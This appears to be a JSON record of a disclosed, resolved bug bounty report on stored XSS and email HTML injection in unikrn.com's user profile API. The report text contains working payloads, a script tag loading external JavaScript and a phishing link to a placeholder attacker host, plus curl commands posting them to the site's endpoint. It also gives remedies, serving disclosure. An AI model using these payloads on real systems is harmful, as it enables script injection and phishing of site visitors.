@@ -1,0 +1,130 @@
+{
+  "id": 262004,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNjIwMDQ=",
+  "url": "https://hackerone.com/reports/262004",
+  "title": "HTML injection in email in unikrn.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2017-08-21T16:32:04.749Z",
+  "submitted_at": "2017-08-21T16:32:04.749Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "coreyd97",
+    "url": "/coreyd97",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/076/569/52304168dce5765d3376eb7f9a18cf6797ab2a7d_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 2672,
+    "url": "https://hackerone.com/unikrn",
+    "handle": "unikrn",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Unikrn",
+      "twitter_handle": "unikrnco",
+      "website": "https://unikrn.com",
+      "about": "unikrn offers a world class comprehensive esports betting platform"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-08-23T08:21:40.908Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2017-08-23T08:20:42.012Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to verify and then potentially issue a bounty, so be sure to take your time filling out the report! **Please add the affected domain name in the Title of the report.**\n\n**Summary:** Referral emails sent from unikrn.com are vulnerable to HTML injection via the first name field.\n\n**Description:** Due to a lack of sanitization and validation when posting to https://unikrn.com/apiv2/user/verify a user may set a number of profile fields to values which should not be acceptable. This allows for a possible XSS within the raffle areas of the website and HTML injection within the referral email sent by unikrn.com.\n\nThe user may insert a payload into the firstname field which is later used to generate the users 'callsign'. The callsign value is safely used in other locations in the site within ng-bind attributes however in the case of viewing a raffle winner, the value is instead transformed by the 'vartrans' directive. This directive permits html to be inserted as part of the \"raffle_winner_sidebar_body\" text and is done so without any sanitization. \n\nTherefore should a user set their first name as '<script src=\\\"https://external.com/xss.js\\\" />' when the user wins a raffle, any visitor to that raffles page will result in the external script being loaded.\n\nAlongside this XSS it was also found that should a user set their first name to a value containing a script tag, when a referral email is sent to an address, any email content after the script tag is ignored. As the field's maximum length is 256 characters, an attacker would have 248 characters to craft a malicious email or instead embed an image with the email content to allow for a larger word count. \n\nAn example payload may be \n<a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\n\n\nRemedies for this would include proper sanitization of user fields when processed by the verify page and when passed as arguments to the vartrans directive to prevent similar issues in future, as well as a more strict content security policy and the stripping of all html characters when using user input within parameters to be used within an email.\n\n## Steps To Reproduce:\n## XSS:\n  1. Use the provided curl command to set a users first name to an xss payload such as <script src=\\\"https://external2.com/xss.js\\\" />\n  2. Win a raffle\n  3. Visit the raffles page once you have been announced as a winner.\n## Email HTML Injection:\n 1. Use the provided curl command to set a users first name to a payload such as <a href=\\\"https://attacker/phish.php\\\"><img src=\\\"https://attacker/content.jpg\\\"></a><script>\n2. Navigate to the profile page and send a referral email.\n\n## Supporting Material/References:\n\nXSS\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<script src=\\\\\\\"https://external2.com/xss.js\\\\\\\" />\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\nEmail HTML Injection\n* curl -i -s -k  -X $'POST' -H $'Content-Type: application/json' --data-binary $'{\\\"country\\\":\\\"GB\\\",\\\"firstname\\\":\\\"<a href=\\\\\\\"https://attacker/phish.php\\\\\\\"><img src=\\\\\\\"https://attacker/content.jpg\\\\\\\"></a><script>\\\", \\\"session_id\\\":\\\"SESSION_ID\\\"}'  $'https://unikrn.com/apiv2/user/verify'\n\n\n",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 214633,
+      "file_name": "Email_Content.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/214/633/f688b02ab2ed1deb61824abf48a58f8d42c2f920/Email_Content.png?response-content-disposition=attachment%3B%20filename%3D%22Email_Content.png%22%3B%20filename%2A%3DUTF-8%27%27Email_Content.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQ3BKZOEE%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T124833Z&X-Amz-Expires=1274&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIG6IenXByqkn3Q4DzIOoyCRmUa9piCrSguk1c5%2FILyJ7AiEAykcOsXd4dfj0MtryP7Ypqcz0EGqy2srC7Ahyju9P1wwqsgUIcBADGgwwMTM2MTkyNzQ4NDkiDNoh%2FatXkiXqzvRarSqPBSxRPdxDhM3ZWovfuUDFze8TKTTXyWnM%2BqLvvwol8L9J5VDQFkQXA7smucDX4AEp9WwjM1M5SoDxfIqGVNACAZ%2FhCWOou%2FjPGm5hXxkVid3k%2FfBEIUStu2OCGILQXKrFXckdXocqxibxJkp9FBscVVfy1z9spS224jk9a64wEyKkB%2FEqDONaGznbocoqfOWRO2gk3kN2mF%2FlFYwuvjMbBGI25CA0c8P0uDrdXv75mMgHiHzhQ2UA0io6mOBJRxlcl5iTWXpEwOcbqq7%2B5ONf7AQWMJlf044SZPS7ctrMSsbHt11897THGeHPEYn6tBP8I5Fnd6qJj2f%2FVMm2nAjyPv65mqH9IFrso33MbOg9OScFT8GcXL%2FSL9CsmuqI8DAuHV2TQ6tOcf60FFoK%2FNc8%2BH1opXPi5t84Wy8dXz0ShSZARezbri6JYCQuZaMmQWSTRbaOxgDpQUbmc2MtnSfbshwx0iX%2BKoAaAhWHkgNlastBKxxdkZZfKj3uPWL%2FAZpJ5vQ3aCiYuhMiLdSNoDq04UJUEE6U3x5bncELirAw9rSBGBlZ2LnTIizRqNNZcm4bzUeL8KfXYWONTy2NjqxuN2Pv%2FhvWs7ZeUu%2Bl5RyG%2BaglXVojqzVcfe0pYyyTxENUtLQnCxv1F6%2BFRPB1kbi%2FlMdY30Ih91ui923zixOr4x2bTvqsEUosHXQuAePevTEs9cXth9Tl9dEZ77qdYODIErVxnZKWIWL%2Bdg57Wo05wOYkPoMuK0ANx9QnIFRVpYN51rM3ygm3cI0FCy6O67TKyAzlM4W7pyg0gugDJWcmjphUjUsnNWj%2BZQCUHNlg0hrBypo%2BHXJ4oZgGe0%2F80G6Eur1xfPo2GRyn5qtYCGPsRlYw8qesrgY6sQGYbS8MxVrsunWUBMnltzktg6eAZ8fvxgC5j8%2BYmwaIMOuBsufYAl7nKraCTIkLFC7rGgVC8sqvqoXBLrYQFqgLumTDGfWJUNAVMAVtqNo%2BIL8JvOZD%2FTW4GOmqGMXOgQRmU1Wa7j36A2IvAe7wpP5z8dprPILpwsnYzL4pzdM%2FrRrGA5fhAddbNV%2BDoX4yqjS2RN%2BKe8v5EYqHMPr2TCLmUPcDm070amRAZC10%2F9gLePE%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=521ecc5ed93d51c3979056674bab31c2936f8577eef69042db8bcec6b71a8250",
+      "file_size": 92457,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-09-22T08:20:42.078Z",
+  "allow_singular_disclosure_after": -201760071.02970403,
+  "singular_disclosure_allowed": true,
+  "vote_count": 18,
+  "voters": [
+    "flamezzz",
+    "jensec",
+    "jr0ch17",
+    "bl4de",
+    "flashdisk",
+    "fa1rlight",
+    "savitar0x01",
+    "h4x0r_dz",
+    "r3y",
+    "eveeez",
+    "and 8 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 453,
+    "asset_type": "URL",
+    "asset_identifier": "unikrn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
